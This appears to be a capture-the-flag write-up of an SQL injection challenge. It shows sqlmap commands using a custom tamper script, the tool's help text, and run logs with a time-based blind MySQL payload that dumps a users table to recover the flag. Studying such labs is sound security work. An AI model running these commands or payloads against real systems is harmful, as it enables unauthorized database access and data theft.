# sql injection - database
The idea is to use sqlmap to start a time based attack.
- ref 1: How to use a custom tamper.py
https://www.cnblogs.com/hetianlab/p/16012663.html
- ref 2: How to use sqlmap.
https://hackertarget.com/sqlmap-post-request-injection/
- 題目:
http://ctf.adl.tw:12003/
# First use burp to obtain a sample of the post request
- download [Burp(community suite)](https://portswigger.net/burp)
- open browser
- configure burp to intercept http requests
- copy the content of the post request to search-test.txt
# sqlmap
1. Didn't work
```ps
PS D:\1111_work\1111attack_and_defense\sqlmap> py sqlmap.py -u 'http://ctf.adl.tw:12003/' --data "username=123&password=123" --level=5 --risk=3 --tamper=my_tamper/my_tamper.py
```
2. Didn't work
```ps
PS D:\1111_work\1111attack_and_defense\sqlmap> py sqlmap.py -r './my_tamper/search-test.txt'-p username password --tamper=my_tamper/my_tamper.py
```

3. Worked
```ps
PS D:\1111_work\1111attack_and_defense\sqlmap> py sqlmap.py -r './my_tamper/search-test.txt'-p username password -D ctf_users -T users -C password username --tamper=my_tamper/my_tamper.py --dump
```

# Sqlmap logs
```
PS D:\1111_work\1111attack_and_defense\sqlmap> py .\sqlmap.py -h
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.12.7#dev}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: sqlmap.py [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'

Press Enter to continue...
PS D:\1111_work\1111attack_and_defense\sqlmap> py sqlmap.py -r './my_tamper/search-test.txt'-p username --tamper=my_tamper/my_tamper.py --dump-all
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.12.7#dev}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. 
Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:17:53 /2022-12-22/

[10:17:53] [INFO] parsing HTTP request from './my_tamper/search-test.txt'
[10:17:53] [INFO] loading tamper module 'my_tamper'
[10:17:54] [INFO] resuming back-end DBMS 'mysql'
[10:17:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: username=eBpr' RLIKE SLEEP(5)-- itvC&password=&submit=OPis
---
[10:17:54] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[10:17:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[10:17:54] [INFO] sqlmap will dump entries of all tables from all databases now
[10:17:54] [WARNING] cannot properly display (some) Unicode characters inside your terminal ('cp950') environment. All unhandled occurrences will result in replacement with '?' character. Please, find proper character representation inside corresponding output files

[10:17:54] [WARNING] ?前??字列表如下，?注意修改:
['UNION', 'SELECT', 'WHERE', 'AND', 'OR']
[10:17:54] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[10:17:55] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[10:19:31] [INFO] adjusting time delay to 1 second due to good response times
3
[10:19:31] [INFO] retrieved: information_schema
[10:26:12] [INFO] retrieved: performance_schema
[10:32:38] [INFO] retrieved: ctf_users
[10:36:16] [INFO] fetching tables for databases: 'ctf_users, information_schema, performance_schema'
[10:36:16] [INFO] fetching number of tables for database 'ctf_users'
[10:36:16] [INFO] retrieved: 1
[10:36:23] [INFO] retrieved: users
[10:38:09] [INFO] fetching number of tables for database 'performance_schema'
[10:38:09] [INFO] retrieved: 8
[10:38:30] [INFO] retrieved: gl
[10:40:02] [ERROR] invalid character detected. retrying..
[10:40:02] [WARNING] increasing time delay to 2 seconds
obal_statu


[*] ending @ 10:48:13 /2022-12-22/

PS D:\1111_work\1111attack_and_defense\sqlmap> py sqlmap.py -r './my_tamper/search-test.txt'-p username password -D ctf_users -T users -C password username --tamper=my_tamper/my_tamper.py --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12.7#dev}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. 
Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:48:28 /2022-12-22/

[10:48:28] [INFO] parsing HTTP request from './my_tamper/search-test.txt'
[10:48:28] [INFO] loading tamper module 'my_tamper'
[10:48:28] [INFO] resuming back-end DBMS 'mysql'
[10:48:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: username=eBpr' RLIKE SLEEP(5)-- itvC&password=&submit=OPis
---
[10:48:29] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[10:48:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12
[10:48:29] [INFO] fetching entries of column(s) 'password' for table 'users' in database 'ctf_users'
[10:48:29] [INFO] fetching number of column(s) 'password' entries for table 'users' in database 'ctf_users'
[10:48:29] [WARNING] cannot properly display (some) Unicode characters inside your terminal ('cp950') environment. All unhandled occurrences will result in replacement with '?' character. Please, find proper character representation inside corresponding output files

[10:48:29] [WARNING] ?前??字列表如下，?注意修改:
['UNION', 'SELECT', 'WHERE', 'AND', 'OR']
[10:48:29] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[10:49:10] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
7
[10:49:40] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[10:50:10] [INFO] adjusting time delay to 1 second due to good response times
ADL{w474sh1n0furun3muh4k174k174d3su...https://youtu.be/MSnLgdQFk1c}
[11:19:11] [INFO] retrieved: alg
[11:20:29] [WARNING] Ctrl+C detected in dumping phase
Database: ctf_users
Table: users
[1 entry]
+---------------------------------------------------------------------+
| password                                                            |
+---------------------------------------------------------------------+
| ADL{w474sh1n0furun3muh4k174k174d3su...https://youtu.be/MSnLgdQFk1c} |
+---------------------------------------------------------------------+

[11:20:29] [INFO] table 'ctf_users.users' dumped to CSV file 'C:\Users\Perry\AppData\Local\sqlmap\output\ctf.adl.tw\dump\ctf_users\users.csv'
[11:20:29] [INFO] fetched data logged to text files under 'C:\Users\Perry\AppData\Local\sqlmap\output\ctf.adl.tw'

[*] ending @ 11:20:29 /2022-12-22/

PS D:\1111_work\1111attack_and_defense\sqlmap> 
```